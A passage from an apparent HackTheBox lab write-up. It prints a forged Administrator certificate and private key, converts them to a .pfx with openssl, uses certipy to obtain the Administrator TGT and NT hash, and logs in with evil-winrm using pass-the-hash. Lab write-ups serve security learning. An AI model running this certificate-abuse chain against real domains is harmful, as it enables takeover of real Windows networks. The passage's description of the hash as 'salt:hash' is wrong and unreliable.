        B7QFSZRi4KWIlVX/0S4zDr0u/QeG179USpZALKesuZeNAoRma6OdJSMgjrG8BXax
        OmI3gjECgYEAxYhEsAXibUmUKVQw7Fic8NJ2rFWh1h1VtYSo9nYUqF3NebzNfBf6
        1M+rxXf0ErF5Dzp/unWCRN2v3xCzRTDsv1xleR/y2hc89YcnfWJDLaZJTD7YP8ZS
        GFyROgspNgvRcmYkQY/FdDpryY1oNL3XNq6SelDOGMgENdOU9UJfqX8=
        -----END RSA PRIVATE KEY-----
        -----BEGIN CERTIFICATE-----
        MIIFcjCCBFqgAwIBAgITVAAAABkNQCiEaGhMeAAAAAAAGTANBgkqhkiG9w0BAQsF
        ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
        MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNTA1MDYyMDQ2MTZaFw0yNzA1
        MDYyMDU2MTZaMFMxEzARBgoJkiaJk/IsZAEZFgNodGIxFjAUBgoJkiaJk/IsZAEZ
        FgZzZXF1ZWwxDjAMBgNVBAMTBVVzZXJzMRQwEgYDVQQDEwtSeWFuIEhvd2FyZDCC
        ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMsJpsdo8lmLWQ2sU5zDoFcO
        ZWEhbEJ6dEkPLGkb63LSrU3+q8xSUKD+aJCz/68X2+LXrVoL9tcxWtxCc6pcTDe3
        8xJIdBkivR2byAQkYZRXBX9TA+E9CtYvlTjcXNudAa0nufHBaJR1eVFP5yQox+Rs
        9nFg5bcCbr4rCckB/ERQ/JGUsFTT37NwBxN5CLRbQKoiR7WdoE8WU90i1sx1Gl2J
        QIXt51xINd4I1AAVsHrx+Ou4HaKfibguyxmh1/VkFCc8DeDnvdj5d/Qk+mSD4lIz
        65W5RBmDjNcYQWA2dUBa2uYvcwH5ZZOR4iur0LLo+xZ++AvltNYw0UKU28EZqXUC
        AwEAAaOCAkowggJGMD0GCSsGAQQBgjcVBwQwMC4GJisGAQQBgjcVCIOFgESHvJM3
        hdGJJcLeUoTxqjiBKYb4snGD5uhaAgFkAgECMA4GA1UdDwEB/wQEAwIHgDAdBgNV
        HQ4EFgQUIkyMwTAFzYk2aMYAcduNJhz2JeIwKAYDVR0RBCEwH6AdBgorBgEEAYI3
        FAIDoA8MDUFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAUxkG5tuQOR9YGWmzxisaU
        /Rr7uMMwgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049c2VxdWVs
        LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
        ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRi
        P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
        aXN0cmlidXRpb25Qb2ludDCBvwYIKwYBBQUHAQEEgbIwga8wgawGCCsGAQUFBzAC
        hoGfbGRhcDovLy9DTj1zZXF1ZWwtREMwMS1DQSxDTj1BSUEsQ049UHVibGljJTIw
        S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1z
        ZXF1ZWwsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0
        aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQAXs9co+ZpgAzGn
        TKWgG+gNJNeJYGK4ftqecfitQoFBJ9YvBGKlYEOQoAgp9SaBTWJ87z4+hxKy3OQB
        dNLmzbvnbJrPrgcioOs9mq/djzCCLvdHc/xVDBXT3UoV2D18kBoAtAxZFfoi6pnk
        hkcasSLBK62DNoOcHICHWARL5xDHBlLEU7IZYTUHQ/CJyQuct1Ls77SiIPFLnsnJ
        qcL6hl8D+qkTJnEE5tpAxdPcfRfbGlL3ZV17I0WXAlyxA5aiUEIhr1/x666veSnx
        T7kguW/x/mghBIWSLW9f2fNcXPy+2LKsRYjx3cXUhgschWZPqHmqLNTKJO0RZVBR
        ZsF/5Cs8
        -----END CERTIFICATE-----
```
####
The **perm** file is not generated in the target machine so we need to copy both things, the key and the certificate, and paste in one file with the exactly format that you can see in the previous output. The file will have a `.pem` extention for after create a `.pfx` file. To do this we will use a **openssl**.
####
```ruby
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx -passout pass:
```
####
| Openssl param | Description |
| ----- | ----- |
| pkcs12 | Specifies the *PKCS#12* tool for creating `.pfx` or `.p12` files (used for storing certificates and private keys) |
| -in | Path of the file |
| -keyex | Sets the key exchange attribute (used for legacy compatibility, mainly with Microsoft CSPs) |
| -export | Tells OpenSSL to create a new *PKCS#12* file |
| -out cert.pfx | Output file name for the resulting *PKCS#12* `.pfx` file |
| -passout pass: | Set a empty or null password |
####
Finally using that *PFX* file we can to get a TGT hash of the **Administrator** user:
####
```ruby
faketime "2025-05-06 15:44:55" certipy auth -pfx cert.pfx -dc-ip 10.10.11.51 -domain sequel.htb
    Result ->
    [*] Using principal: administrator@sequel.htb
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
####
The format of the hash is **salt:hash**, so we can use it in evil-winrm: `evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff`.
####
| Evil-winrm param | Description |
| ----- | ----- |
| -i | Specify the ip target host |
| -u | Specify the user |
| -H | Specify the hash password format |